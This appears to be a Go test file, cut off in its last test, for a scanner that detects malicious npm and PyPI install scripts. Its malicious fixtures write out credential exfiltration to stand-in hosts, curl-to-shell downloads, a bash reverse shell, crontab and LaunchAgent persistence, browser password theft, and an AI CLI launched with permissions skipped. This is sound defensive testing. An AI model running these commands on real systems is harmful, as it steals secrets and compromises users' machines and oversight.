package core

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"reflect"
	"sort"
	"strings"
	"testing"
	"time"
)

// Every sample here is inert text written for these tests and never run: the benign ones are modelled on what common
// packages' install scripts do, the malicious ones on what public write-ups of npm and PyPI incidents describe.

// installBenign: install scripts that must not be reported.
var installBenign = map[string]string{
	// A prebuilt binary's installer (esbuild's kind): the platform's package, else a download from the registry.
	"prebuilt-download.js": `"use strict";
const fs = require("fs");
const os = require("os");
const path = require("path");
const zlib = require("zlib");
const https = require("https");
const child_process = require("child_process");
const versionFromPackageJSON = require(path.join(__dirname, "package.json")).version;
const toPath = path.join(__dirname, "bin", "tool");
function fetch(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      if ((res.statusCode === 301 || res.statusCode === 302) && res.headers.location)
        return fetch(res.headers.location).then(resolve, reject);
      if (res.statusCode !== 200) return reject(new Error("Server responded with " + res.statusCode));
      let chunks = [];
      res.on("data", (chunk) => chunks.push(chunk));
      res.on("end", () => resolve(Buffer.concat(chunks)));
    }).on("error", reject);
  });
}
function extractFileFromTarGzip(buffer, subpath) {
  buffer = zlib.unzipSync(buffer);
  let offset = 0;
  while (offset < buffer.length) {
    let name = buffer.toString("utf8", offset, offset + 100).replace(/\0.*/g, "");
    offset += 512;
  }
  throw new Error("Could not find " + JSON.stringify(subpath));
}
async function downloadDirectlyFromNPM(pkg, subpath, binPath) {
  const url = (process.env.npm_config_registry || "https://registry.npmjs.org") + "/" + pkg + "/-/" + pkg + "-" + versionFromPackageJSON + ".tgz";
  fs.writeFileSync(binPath, extractFileFromTarGzip(await fetch(url), subpath));
  fs.chmodSync(binPath, 0o755);
}
function validateBinaryVersion(...command) {
  const stdout = child_process.execFileSync(command.shift(), command, { stdio: "pipe" }).toString().trim();
  if (stdout !== versionFromPackageJSON) throw new Error("Expected " + versionFromPackageJSON);
}
async function checkAndPreparePackage() {
  if (process.env.TOOL_BINARY_PATH) return;
  const platform = os.platform() + "-" + os.arch();
  try {
    require.resolve("@tool/" + platform + "/bin/tool");
  } catch {
    await downloadDirectlyFromNPM("@tool/" + platform, "package/bin/tool", toPath);
  }
}
checkAndPreparePackage().then(() => validateBinaryVersion(toPath, "--version"));
`,
	// A browser download into the user's cache folder (puppeteer's kind).
	"browser-download.mjs": `import {homedir} from 'node:os';
import {join} from 'node:path';
import https from 'node:https';
import {createWriteStream, mkdirSync, existsSync} from 'node:fs';
const cacheDir = process.env.PUPPETEER_CACHE_DIR ?? join(homedir(), '.cache', 'puppeteer');
if (process.env.PUPPETEER_SKIP_DOWNLOAD) {
  console.log('**INFO** Skipping browser download.');
  process.exit(0);
}
const proxy = process.env.HTTPS_PROXY || process.env.npm_config_https_proxy;
function download(url, dest) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, {method: 'GET', agent: proxy ? makeAgent(proxy) : undefined}, res => {
      res.pipe(createWriteStream(dest)).on('finish', resolve);
    });
    req.on('error', reject);
    req.end();
  });
}
mkdirSync(cacheDir, {recursive: true});
if (!existsSync(join(cacheDir, 'chrome'))) await download(baseUrl + '/chrome-mac-arm64.zip', join(cacheDir, 'chrome.zip'));
`,
	// A banner asking for donations (core-js's kind).
	"banner.js": `var fs = require('fs');
var os = require('os');
var path = require('path');
var env = process.env;
var ADBLOCK = is(env.ADBLOCK);
var COLOR = is(env.npm_config_color);
var DISABLE_OPENCOLLECTIVE = is(env.DISABLE_OPENCOLLECTIVE);
var SILENT = ['silent', 'error', 'warn'].indexOf(env.npm_config_loglevel) !== -1;
var OPEN_SOURCE_CONTRIBUTOR = is(env.OPEN_SOURCE_CONTRIBUTOR);
var MINUTE = 60 * 1000;
var BANNER = '\u001B[96mThank you for using this library!\u001B[0m\n' +
  'The project needs your help! Please consider supporting it on Open Collective.\n';
function is(it) { return !!it && it !== '0' && it !== 'false'; }
function isBannerRequired() {
  if (ADBLOCK || DISABLE_OPENCOLLECTIVE || SILENT || OPEN_SOURCE_CONTRIBUTOR) return false;
  var file = path.join(os.tmpdir(), 'core-js-banners');
  var banners = [];
  try {
    var DELTA = Date.now() - fs.statSync(file).mtime;
    if (DELTA >= 0 && DELTA < MINUTE * 3) {
      banners = JSON.parse(fs.readFileSync(file, 'utf8'));
      if (banners.indexOf(BANNER) !== -1) return false;
    }
  } catch (error) { banners = []; }
  try { banners.push(BANNER); fs.writeFileSync(file, JSON.stringify(banners), 'utf8'); } catch (error) { /* empty */ }
  return true;
}
if (isBannerRequired()) console.log(COLOR ? BANNER : BANNER.replace(/\u001B\[\d+m/g, ''));
`,
	// A native module's fallback: a prebuilt binary, else build from source.
	"native-fallback.js": `const { spawnSync } = require('child_process');
const path = require('path');
function tryPrebuilt() {
  try { require('node-gyp-build')(path.join(__dirname, '..')); return true } catch (e) { return false }
}
if (!tryPrebuilt()) {
  const npm = process.platform === 'win32' ? 'npm.cmd' : 'npm';
  const r = spawnSync(npm, ['run', 'build-from-source'], { stdio: 'inherit', cwd: path.join(__dirname, '..') });
  process.exit(r.status);
}
`,
	// Engines downloaded with a token for GitHub's rate limit, and a telemetry ping with the platform only.
	"engines-download.js": `const os = require('os');
const https = require('https');
const fs = require('fs');
const headers = { 'User-Agent': 'engines-installer' };
if (process.env.GITHUB_TOKEN) headers.Authorization = 'token ' + process.env.GITHUB_TOKEN;
https.get(releaseUrl(os.platform(), os.arch()), { headers }, res => res.pipe(fs.createWriteStream(target)));
async function ping() {
  await fetch('https://checkpoint.example.invalid/v1/check', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ product: 'engines', version: VERSION, platform: os.platform(), arch: os.arch() }),
  }).catch(() => {});
}
ping();
`,
	// A sass binding downloader that reads its mirror from npm's settings.
	"binding-download.js": `var fs = require('fs'),
  path = require('path'),
  sass = require('../lib/extensions'),
  request = require('./util/downloadoptions');
function download(url, dest, cb) {
  var reportError = function(err) {
    var timeoutMessge;
    cb('Cannot download "' + url + '": ' + err);
  };
  try {
    request(url, sass.getProxy(), function(err, response, buffer) {
      if (err) reportError(err);
      else fs.createWriteStream(dest).end(buffer);
    });
  } catch (err) { cb(err); }
}
var binaryUrl = process.env.SASS_BINARY_SITE || process.env.npm_config_sass_binary_site || sass.getBinaryUrl();
download(binaryUrl, sass.getBinaryPath(), function(err) { if (err) { console.error(err); return; } console.log('Binary saved'); });
`,
	// A git hooks installer (husky and lefthook's kind): writes into the project's .git/hooks.
	"git-hooks.js": `const fs = require('fs');
const path = require('path');
const cp = require('child_process');
if (process.env.CI || process.env.HUSKY === '0') process.exit(0);
const gitDir = cp.execSync('git rev-parse --git-dir').toString().trim();
const hooks = path.join(gitDir, 'hooks');
fs.mkdirSync(hooks, { recursive: true });
fs.writeFileSync(path.join(hooks, 'pre-commit'), '#!/bin/sh\nnpx lint-staged\n', { mode: 0o755 });
cp.execSync('git config core.hooksPath .husky');
`,
	// A shell installer that builds a C library.
	"build.sh": `#!/bin/sh
set -e
cd "$(dirname "$0")/deps/libfoo"
if [ -f Makefile ]; then make clean; fi
./configure --prefix="$PWD/../../build" --disable-shared
make -j4
make install
echo "libfoo built"
`,
	// A message for the timezone (es5-ext's kind) and a version check.
	"notice.js": `"use strict";
var timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
if (timeZone === "Europe/Kiev") console.log("A message for you.");
var semver = require("semver");
if (!semver.satisfies(process.version, ">=14")) console.warn("This package needs Node 14 or newer.");
`,
	// Python: a setup.py that builds an extension and downloads headers.
	"setup.py": `import os
import subprocess
import sys
from urllib.request import urlretrieve
from setuptools import setup, Extension
from setuptools.command.build_ext import build_ext

HERE = os.path.abspath(os.path.dirname(__file__))
with open(os.path.join(HERE, "README.md"), encoding="utf-8") as f:
    long_description = f.read()

class CMakeBuild(build_ext):
    def run(self):
        if not os.path.exists(os.path.join(HERE, "include", "lib.h")):
            urlretrieve("https://downloads.example.invalid/lib-1.2.tar.gz", "lib.tar.gz")
        subprocess.check_call(["cmake", HERE, "-DCMAKE_BUILD_TYPE=Release"], cwd=self.build_temp)
        subprocess.check_call(["cmake", "--build", "."], cwd=self.build_temp)

setup(
    name="fastlib",
    version=os.environ.get("FASTLIB_VERSION", "1.0.0"),
    long_description=long_description,
    ext_modules=[Extension("fastlib._core", ["src/core.c"])],
    cmdclass={"build_ext": CMakeBuild},
)
`,
	// A CLI that installs its shell completion only when asked, and says how.
	"completion.js": `const os = require('os');
const path = require('path');
const rc = path.join(os.homedir(), '.zshrc');
if (process.env.npm_config_global) {
  console.log('To enable completion, add this line to ' + rc + ':');
  console.log('  source <(mycli completion zsh)');
}
`,
	// Sentry-style CLI download with a checksum and chmod.
	"cli-download.js": `const crypto = require('crypto');
const fs = require('fs');
const https = require('https');
const { execSync } = require('child_process');
const file = require('path').join(__dirname, 'bin', 'cli');
https.get(process.env.CLI_CDNURL || defaultUrl, res => {
  const out = fs.createWriteStream(file);
  res.pipe(out);
  out.on('finish', () => {
    const sum = crypto.createHash('sha256').update(fs.readFileSync(file)).digest('hex');
    if (sum !== EXPECTED) throw new Error('checksum mismatch');
    fs.chmodSync(file, 0o755);
    execSync(file + ' --version', { stdio: 'inherit' });
  });
});
`,
	// A client connecting to a host it was given (undici's kind): a variable named hostname is not the host's name.
	"connect.js": `const net = require('net');
function connect({ hostname, host, protocol, port, servername }) {
  const socket = net.connect({ host: hostname, port: port || 80 });
  socket.setNoDelay(true);
  return socket;
}
module.exports = connect;
`,
	// Hook commands as package.json has them.
	"hooks.txt": strings.Join([]string{
		"node-gyp rebuild",
		"prebuild-install || node-gyp rebuild",
		"node-pre-gyp install --fallback-to-build",
		"node install.js",
		"node -e \"try{require('./postinstall')}catch(e){}\"",
		"npx only-allow pnpm",
		"husky install",
		"patch-package",
		"opencollective-postinstall || true",
		"node-gyp-build",
		"(node install/libvips && node install/dll-copy && prebuild-install) || (node install/can-compile && node-gyp rebuild && node install/dll-copy)",
		"node ./scripts/postinstall.js || exit 0",
		"cross-env NODE_ENV=production node build.js",
		"node buildcheck.js > buildcheck.gypi && node-gyp rebuild",
		"is-ci || husky install",
		"node -e \"process.exit(0)\"",
	}, "\n"),
}

// installMalicious: what each must be reported for (a part of a label).
var installMalicious = []struct {
	name, text, want string
}{
	{"npmrc-post", `const fs = require('fs'), os = require('os'), path = require('path'), https = require('https');
const rc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
const req = https.request({ hostname: 'collect.example.invalid', method: 'POST', path: '/n' });
req.write(rc); req.end();
`, "npm 的登录令牌"},
	{"ssh-aws-discord", `const fs = require('fs');
const home = require('os').homedir();
const keys = [fs.readFileSync(home + '/.ssh/id_rsa', 'utf8'), fs.readFileSync(home + '/.aws/credentials', 'utf8')];
fetch('https://discord.com/api/webhooks/000/fixture', { method: 'POST', body: JSON.stringify(keys) });
`, "SSH 私钥"},
	{"dep-confusion", `const os = require('os');
const dns = require('dns');
const data = Buffer.from(JSON.stringify({ u: os.userInfo().username, h: os.hostname(), d: __dirname })).toString('hex');
dns.lookup(data.slice(0, 60) + '.probe.example.invalid', () => {});
`, "用户名、主机名"},
	{"dep-confusion-oast", `const os = require("os"), https = require("https");
const q = JSON.stringify({ host: os.hostname(), user: os.userInfo().username, cwd: process.cwd() });
const r = https.request({ hostname: "abc123.oastify.com", method: "POST", path: "/" }); r.write(q); r.end();
`, "用户名、主机名"},
	{"curl-sh", `#!/bin/sh
curl -fsSL https://x.example.invalid/s.sh | bash
`, "从网上下载代码直接运行"},
	{"wget-sh-in-js", `require('child_process').execSync('wget -qO- https://x.example.invalid/p | sh', { stdio: 'ignore' });
`, "从网上下载代码直接运行"},
	{"eval-buffer", `eval(Buffer.from(payload, 'base64').toString('utf8'));
`, "把编码过的内容解开直接运行"},
	{"exec-buffer", `require('child_process').execSync(Buffer.from(cmd, 'base64').toString());
`, "把编码过的内容解开直接运行"},
	{"node-e-blob", "node -e \"eval(require('zlib').inflateSync(Buffer.from('" + strings.Repeat("eJzLSM3JyVcozy/KSQEAGgQEXQ", 6) + "','base64')).toString())\"\n", "解开直接运行"},
	{"python-c-blob", "python3 -c \"import base64;exec(base64.b64decode('" + base64.StdEncoding.EncodeToString([]byte(strings.Repeat("import os;os.system('id');", 6))) + "'))\"\n", "解开直接运行"},
	{"blob-hidden-curl", "const s = '" + base64.StdEncoding.EncodeToString([]byte(strings.Repeat("pad ", 30)+"\ncurl -s https://x.example.invalid/a | bash\n")) + "';\nconst run = s;\n", "藏在编码里"},
	{"trufflehog", `const { execSync } = require('child_process');
const out = execSync('trufflehog filesystem ' + require('os').homedir() + ' --json').toString();
`, "找密钥的工具"},
	{"workflow", `const fs = require('fs');
fs.mkdirSync('.github/workflows', { recursive: true });
fs.writeFileSync('.github/workflows/ci-helper.yml', workflowText);
`, "GitHub Actions 工作流"},
	{"gh-repo", `await fetch('https://api.github.com/user/repos', { method: 'POST', headers: { Authorization: 'token ' + process.env.GITHUB_TOKEN }, body: JSON.stringify({ name: 'backup' }) });
`, "建仓库"},
	{"npm-publish", `execSync('npm version patch --no-git-tag-version && npm publish --access public', { cwd: dir });
`, "发布包"},
	{"launchagent", `const fs = require('fs'), os = require('os'), path = require('path');
fs.writeFileSync(path.join(os.homedir(), 'Library', 'LaunchAgents', 'com.example.helper.plist'), plist);
require('child_process').execSync('launchctl load ~/Library/LaunchAgents/com.example.helper.plist');
`, "LaunchAgents"},
	{"zshrc", `const fs = require('fs'), os = require('os'), path = require('path');
fs.appendFileSync(path.join(os.homedir(), '.zshrc'), '\nsudo shutdown -h 0\n');
`, "shell 的启动文件"},
	{"crontab", `#!/bin/sh
(crontab -l 2>/dev/null; echo "*/10 * * * * $HOME/.cache/.u") | crontab -
`, "crontab"},
	{"browser-wallet", `const fs = require('fs'), os = require('os');
const p = os.homedir() + '/Library/Application Support/Google/Chrome/Default/Login Data';
const w = os.homedir() + '/Library/Application Support/Exodus/exodus.wallet';
fs.copyFileSync(p, '/tmp/.l');
`, "浏览器保存的密码"},
	{"ai-cli-yolo", `const { spawnSync } = require('child_process');
spawnSync('claude', ['--dangerously-skip-permissions', '-p', prompt]);
`, "跳过确认"},
	// Joined at run time: written as one string it sits in this test binary, and TestOwnRulesDoNotMatchThisProgram
	// finds luoke_reverse_shell's "bash -i" in it.
	{"reverse-shell", "#!/bin/sh\n" + strings.Join([]string{"bash", "-i", ">&", "/dev/tcp/198.51.100.7/4444", "0>&1"}, " ") + "\n", "反弹 shell"},
	{"download-chmod", `#!/bin/sh
curl -sL -o /tmp/.jsext https://x.example.invalid/jsextension
chmod +x /tmp/.jsext
/tmp/.jsext -k &
`, "下载程序、加上执行权限"},
	{"setup-py-exfil", `import os, requests
from setuptools import setup
from setuptools.command.install import install
class PostInstall(install):
    def run(self):
        creds = open(os.path.expanduser('~/.aws/credentials')).read()
        requests.post('https://collect.example.invalid/a', data=creds)
        install.run(self)
setup(name='helper', cmdclass={'install': PostInstall})
`, "AWS 的凭证"},
	{"setup-py-curl", `import os
from setuptools import setup
os.system("curl -s https://x.example.invalid/i | sh")
setup(name="helper")
`, "从网上下载代码直接运行"},
	{"env-to-drop", `fetch('https://webhook.site/0000-fixture', { method: 'POST', body: process.env.NPM_TOKEN });
`, "环境变量里的"},
	{"env-all", `const https = require('https');
https.request({ host: 'c.example.invalid', method: 'POST' }).end(JSON.stringify(process.env));
`, "全部环境变量"},
	{"minified", strings.Repeat("var a=1,b=2;function x(){return a+b}", 300) + ";require('child_process').exec('curl -s https://x.example.invalid/m|sh');" + strings.Repeat("var c=3;", 400) + "\n", "从网上下载代码直接运行"},
}

func TestInstallBenignCorpusIsQuiet(t *testing.T) {
	for name, text := range installBenign {
		if s := InstallScriptSignals(text); len(s) > 0 {
			t.Errorf("%s: %+v", name, s)
		}
	}
}

func TestInstallMaliciousCorpusIsCaught(t *testing.T) {
	for _, c := range installMalicious {
		s := InstallScriptSignals(c.text)
		hit := false
		for _, x := range s {
			if strings.Contains(x.Label, c.want) {
				hit = true
			}
			if len(x.Lines) == 0 || x.Phrase == "" {
				t.Errorf("%s: %+v has no line or phrase", c.name, x)
			}
		}
		if !hit {
			t.Errorf("%s: want %q, got %+v", c.name, c.want, s)
		}
	}
}

func TestInstallSignalsSayWhereNotWhat(t *testing.T) {
	s := InstallScriptSignals(installMalicious[0].text)
	if len(s) != 1 || s[0].Severity != High || !reflect.DeepEqual(s[0].Lines, []int{2, 3}) || s[0].Phrase != "把 npm 的登录令牌（~/.npmrc）发出去" {
		t.Fatalf("%+v", s)
	}
	for _, x := range s {
		if strings.Contains(x.Label, "example") || strings.Contains(x.Phrase, "https") {
			t.Errorf("text of the script in %+v", x)
		}
	}
}

func TestInstallCommandTargets(t *testing.T) {
	cases := []struct {
		cmd            string
		files, scripts []string
	}{
		{"node install.js", []string{"install.js"}, nil},
		{"node ./scripts/postinstall.js || exit 0", []string{"./scripts/postinstall.js"}, nil},
		{"node -e \"process.exit(0)\"", nil, nil},
		{"node -e \"try{require('./postinstall')}catch(e){}\" || exit 0", []string{"./postinstall"}, nil},
		{"node -e \"require('lodash')\"", nil, nil},
		{"node --require ./hook.js lib/setup", []string{"./hook.js", "lib/setup"}, nil},
		{"node -r ./a.js --import=./b.mjs x.js", []string{"./a.js", "./b.mjs", "x.js"}, nil},
		{"NODE_OPTIONS='--require ./evil.js' node-gyp rebuild", []string{"./evil.js"}, nil},
		{"cross-env NODE_OPTIONS=--require=./evil.js prebuild-install", []string{"./evil.js"}, nil},
		{"echo ok\nnode evil.js", []string{"evil.js"}, nil},
		{"echo ok\r\nsh ./x.sh", []string{"./x.sh"}, nil},
		{"# node commented.js\nnode real.js", []string{"real.js"}, nil},
		{"nohup node bg.js &", []string{"bg.js"}, nil},
		{"time command node t.js", []string{"t.js"}, nil},
		{"if [ -z \"$CI\" ]; then node a.js; fi", []string{"a.js"}, nil},
		{"{ node b.js; }", []string{"b.js"}, nil},
		{"! node c.js", []string{"c.js"}, nil},
		{"sh -c 'node d.js && npm run x'", []string{"d.js"}, []string{"x"}},
		{"node -e \"console.log('a\nb')\"", nil, nil},
		{"sh ./setup.sh && bash -c 'echo hi'", []string{"./setup.sh"}, nil},
		{"python3 -m pip install .", nil, nil},
		{"python3 build.py", []string{"build.py"}, nil},
		{"node-gyp rebuild", nil, nil},
		{"prebuild-install || node-gyp rebuild", nil, nil},
		{"cross-env NODE_ENV=production node build.js", []string{"build.js"}, nil},
		{"FOO=1 ./bin/postinstall", []string{"./bin/postinstall"}, nil},
		{"npm run build && node check.mjs", []string{"check.mjs"}, []string{"build"}},
		{"yarn setup", nil, []string{"setup"}},
		{"(node install/libvips && prebuild-install) || (node install/can-compile && node-gyp rebuild)", []string{"install/libvips", "install/can-compile"}, nil},
		{"/usr/bin/env node install.js", []string{"install.js"}, nil},
		{"husky install", nil, nil},
		// A shell's options before the file: -e, -eu, -o pipefail, --; -c among one-letter options.
		{"sh -e x.sh", []string{"x.sh"}, nil},
		{"bash -eu -o pipefail ./y.sh", []string{"./y.sh"}, nil},
		{"sh -x -- w.sh", []string{"w.sh"}, nil},
		{"bash +x --norc v.sh", []string{"v.sh"}, nil},
		{"bash -ec 'node z.js'", []string{"z.js"}, nil},
		{"sh -c -e 'node z.js'", nil, nil},
	}
	for _, c := range cases {
		files, scripts := InstallCommandTargets(c.cmd)
		if !reflect.DeepEqual(files, c.files) || !reflect.DeepEqual(scripts, c.scripts) {
			t.Errorf("%q: files %q scripts %q, want %q %q", c.cmd, files, scripts, c.files, c.scripts)
		}
	}
}

func writeFiles(t *testing.T, root string, files map[string]string) {
	t.Helper()
	for rel, text := range files {
		p := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(text), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

func TestInstallTargetFileStaysInThePackage(t *testing.T) {
	root := t.TempDir()
	pkg := filepath.Join(root, "pkg")
	writeFiles(t, root, map[string]string{"pkg/install.js": "1", "pkg/lib/setup.cjs": "1", "pkg/dir/index.js": "1", "outside.js": "1"})
	os.Symlink(filepath.Join(root, "outside.js"), filepath.Join(pkg, "link.js"))
	os.Symlink(root, filepath.Join(pkg, "up"))
	for written, want := range map[string]string{"install.js": "install.js", "./install": "install.js", "lib/setup": "lib/setup.cjs",
		"dir": "dir/index.js", "../outside.js": "", "/etc/passwd": "", "link.js": "", "up/outside.js": "", "$HOME/x.js": "", "missing.js": ""} {
		got, ok := InstallTargetFile(pkg, written)
		if got != want || ok != (want != "") {
			t.Errorf("%q: %q %v, want %q", written, got, ok, want)
		}
	}
}

func TestParseInstallPackage(t *testing.T) {
	p, ok := ParseInstallPackage([]byte("{\n  \"name\": \"demo\",\n  \"version\": \"1.2.3\",\n  \"config\": {\"install\": \"x\"},\n  \"scripts\": {\n    \"test\": \"jest\",\n    \"postinstall\": \"node p.js\",\n    \"install\": \"node-gyp rebuild\"\n  }\n}\n"))
	if !ok || p.Name != "demo" || p.Version != "1.2.3" || len(p.Hooks) != 2 || p.Lines["postinstall"] != 7 || p.Lines["install"] != 8 {
		t.Fatalf("%+v", p)
	}
	if _, ok := ParseInstallPackage([]byte("not json")); ok {
		t.Error("not json parsed")
	}
	if w := installWho(InstallPackage{Name: "Evil Name https://x", Version: "1.0.0"}, "/p/node_modules/folder"); w != "folder@1.0.0" {
		t.Errorf("odd name shown: %s", w)
	}
	if w := installWho(InstallPackage{Name: "@scope/pkg", Version: "see https://x"}, "/p/node_modules/@scope/pkg"); w != "@scope/pkg" {
		t.Errorf("odd version shown: %s", w)
	}
	// A look-alike claiming another package's name is shown by its folder.
	if w := installWho(InstallPackage{Name: "react", Version: "18.0.0"}, "/p/node_modules/raect"); w != "raect@18.0.0" {
		t.Errorf("claimed name shown: %s", w)
	}
	if w := installWho(InstallPackage{Name: "x"}, "/p/node_modules/Odd Name"); w != "一个名字不合规矩的包" {
		t.Errorf("odd folder shown: %s", w)
	}
}

// installHome is a fake home with a project whose dependencies are given.
func installHome(t *testing.T) (*Context, string) {
	root := t.TempDir()
	home := filepath.Join(root, "home")
	os.MkdirAll(filepath.Join(home, "Projects"), 0o755)
	store, err := OpenStore(filepath.Join(root, "data"))
	if err != nil {
		t.Fatal(err)
	}
	c := NewContext(home)
	c.Now, c.Store, c.ProjectRoots = FixtureNow, store, []string{filepath.Join(home, "Projects")}
	return &c, root
}

func pkgJSON(name, version, hooks string) string {
	return `{"name": "` + name + `", "version": "` + version + `", "scripts": {` + hooks + `}}`
}

func TestInstallScriptRuleFindsAndRemembers(t *testing.T) {
	ctx, root := installHome(t)
	app := filepath.Join(ctx.Home, "Projects/app")
	writeFiles(t, app, map[string]string{
		"package.json":                                           pkgJSON("app", "0.1.0", `"postinstall": "node evil.js"`), // the project itself: not a dependency
		"evil.js":                                                installMalicious[0].text,
		"node_modules/good/package.json":                         pkgJSON("good", "1.0.0", `"install": "node-gyp rebuild"`),
		"node_modules/plain/package.json":                        pkgJSON("plain", "1.0.0", `"test": "node evil.js"`),
		"node_modules/plain/evil.js":                             installMalicious[0].text,
		"node_modules/bad/package.json":                          pkgJSON("bad", "1.2.3", `"postinstall": "node lib/p.js"`),
		"node_modules/bad/lib/p.js":                              installMalicious[0].text,
		"node_modules/bad/unrun.js":                              installMalicious[4].text,
		"node_modules/@s/hook/package.json":                      pkgJSON("@s/hook", "2.0.0", `"preinstall": "curl -s https://x.example.invalid/a | sh"`),
		"node_modules/a/node_modules/b/package.json":             pkgJSON("b", "0.0.1", `"install": "sh setup.sh"`),
		"node_modules/a/node_modules/b/setup.sh":                 installMalicious[17].text,
		"node_modules/a/package.json":                            pkgJSON("a", "1.0.0", ""),
		"node_modules/.pnpm/c@1.0.0/node_modules/c/package.json": pkgJSON("c", "1.0.0", `"postinstall": "npm run setup", "setup": "node s.js"`),
		"node_modules/.pnpm/c@1.0.0/node_modules/c/s.js":         installMalicious[13].text,
		"packages/web/node_modules/d/package.json":               pkgJSON("d", "3.0.0", `"postinstall": "node x.js"`),
		"packages/web/node_modules/d/x.js":                       installMalicious[11].text,
		".venv/pyvenv.cfg":                                       "home = /usr/bin\n",
		".venv/src/helper/setup.py":                              installMalicious[22].text,
		".venv/lib/python3.12/site-packages/x/setup.py":          installMalicious[22].text,
	})
	// The same bad package in a second project: one finding, both named.
	writeFiles(t, filepath.Join(ctx.Home, "Projects/other"), map[string]string{
		"node_modules/bad/package.json": pkgJSON("bad", "1.2.3", `"postinstall": "node lib/p.js"`),
		"node_modules/bad/lib/p.js":     installMalicious[0].text,
	})
	// A global package.
	writeFiles(t, filepath.Join(root, "global/node_modules"), map[string]string{
		"g/package.json": pkgJSON("g", "9.9.9", `"postinstall": "node i.js"`),
		"g/i.js":         installMalicious[15].text,
	})
	var read []string
	r := &InstallScriptRule{GlobalDirs: []string{filepath.Join(root, "global/node_modules")}, Limits: DefaultInstallScriptLimits(),
		Read: func(p string) { read = append(read, p) }}
	out, err := r.Run(ctx)
	if err != nil {
		t.Fatal(err)
	}
	titles := map[string]Finding{}
	for _, f := range out {
		titles[f.Title] = f
		if f.Verdict != Confirm || f.Severity != Medium || f.Category != CatMalware {
			t.Errorf("%s: %s %s %s", f.Title, f.Verdict, f.Severity, f.Category)
		}
		for _, v := range append([]string{f.Title}, f.Evidence["why"], f.Evidence["how"]) {
			if strings.Contains(v, "example.invalid") || strings.Contains(v, "curl") || strings.Contains(v, "http") {
				t.Errorf("%s: raw text in %q", f.Title, v)
			}
		}
	}
	want := []string{
		"项目 app 等 2 处的依赖 bad@1.2.3 安装时会把 npm 的登录令牌（~/.npmrc）发出去",
		"项目 app 的依赖 @s/hook@2.0.0 安装时会从网上下载代码直接运行",
		"项目 app 的依赖 b@0.0.1 安装时会改定时任务（crontab）",
		"项目 app 的依赖 c@1.0.0 安装时会用你的 GitHub 令牌建仓库或登记运行器",
		"项目 app 的依赖 d@3.0.0 安装时会跑找密钥的工具，把这台电脑上的密钥都找出来",
		"项目 app 里从源码装的 Python 包 helper 装的时候会把 AWS 的凭证发出去",
		"全局装的 npm 包 g@9.9.9 安装时会在 LaunchAgents 里放东西（开机自己运行），另有 1 处要看",
	}
	for _, w := range want {
		if _, ok := titles[w]; !ok {
			t.Errorf("missing %q", w)
		}
	}
	if len(out) != len(want) {
		for _, f := range out {
			t.Logf("got %q", f.Title)
		}
		t.Errorf("%d findings, want %d", len(out), len(want))
	}
	bad := titles[want[0]]
	if bad.Evidence["hook"] != "postinstall" || bad.Evidence["files"] != "lib/p.js" || !strings.Contains(bad.Evidence["why"], "lib/p.js 第 2、3 行") ||
		bad.Evidence["where"] != "项目 app、项目 other" {
		t.Errorf("evidence %v", bad.Evidence)
	}
	for _, p := range read {
		if strings.HasSuffix(p, "unrun.js") || strings.Contains(p, "site-packages") || strings.HasSuffix(p, "app/evil.js") || strings.HasSuffix(p, "plain/evil.js") {
			t.Errorf("read %s", p)
		}
	}

	// Nothing changed: nothing read again, the same findings.
	read = nil
	again, err := r.Run(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if len(read) != 0 || !reflect.DeepEqual(again, out) {
		t.Errorf("read again %v; same %v", read, reflect.DeepEqual(again, out))
	}
	// One file changed: only it is read again; one fixed: its finding goes.
	writeFiles(t, app, map[string]string{"packages/web/node_modules/d/x.js": "console.log('fixed')\n"})
	read = nil
	third, _ := r.Run(ctx)
	if len(read) != 1 || !strings.HasSuffix(read[0], "d/x.js") || len(third) != len(out)-1 {
		t.Errorf("read %v, %d findings", read, len(third))
	}
}

func TestInstallScriptRuleBounds(t *testing.T) {
	ctx, _ := installHome(t)
	app := filepath.Join(ctx.Home, "Projects/app")
	files := map[string]string{}
	for _, n := range []string{"a", "b", "c", "d"} {
		files["node_modules/"+n+"/package.json"] = pkgJSON(n, "1.0.0", `"postinstall": "node i.js"`)
		files["node_modules/"+n+"/i.js"] = installMalicious[4].text
	}
	files["node_modules/big/package.json"] = pkgJSON("big", "1.0.0", `"postinstall": "node i.js"`)
	files["node_modules/big/i.js"] = installMalicious[4].text + strings.Repeat("// padding\n", 2000)
	writeFiles(t, app, files)
	r := &InstallScriptRule{Limits: DefaultInstallScriptLimits()}
	r.Limits.MaxPackages, r.Limits.MaxFileBytes = 3, 1000
	out, err := r.Run(ctx)
	if err != nil {
		t.Fatal(err)
	}
	// a, b, big looked at (big too large to read); c, d over the limit.
	n, partial := 0, Finding{}
	for _, f := range out {
		if f.Rule == "deps.install-script" {
			n++
		} else {
			partial = f
		}
	}
	if n != 2 || partial.Rule != "deps.install-script.partial" || partial.Evidence["files"] != "1" || !strings.Contains(partial.Title, "依赖太多") {
		t.Errorf("%d findings, partial %+v", n, partial)
	}
}

func TestInstallScriptRuleWithoutFullDiskAccess(t *testing.T) {
	ctx, _ := installHome(t)
	docs := filepath.Join(ctx.Home, "Documents/GitHub")
	writeFiles(t, filepath.Join(docs, "p"), map[string]string{
		"node_modules/x/package.json": pkgJSON("x", "1.0.0", `"postinstall": "curl -s https://x.example.invalid/a | sh"`)})
	ctx.ProjectRoots = append(ctx.ProjectRoots, docs)
	no := false
	ctx.FullDiskAccess = &no
	var read []string
	r := &InstallScriptRule{Limits: DefaultInstallScriptLimits(), Read: func(p string) { read = append(read, p) }}
	_, err := r.Run(ctx)
	se, ok := err.(*SkippedError)
	if !ok || !strings.HasPrefix(se.Reason, NoAccessMark) || len(read) != 0 {
		t.Errorf("%v, read %v", err, read)
	}
}

func TestInstallScriptRuleInterrupted(t *testing.T) {
	ctx, _ := installHome(t)
	writeFiles(t, filepath.Join(ctx.Home, "Projects/app"), map[string]string{
		"node_modules/x/package.json": pkgJSON("x", "1.0.0", `"postinstall": "node i.js"`), "node_modules/x/i.js": installMalicious[4].text})
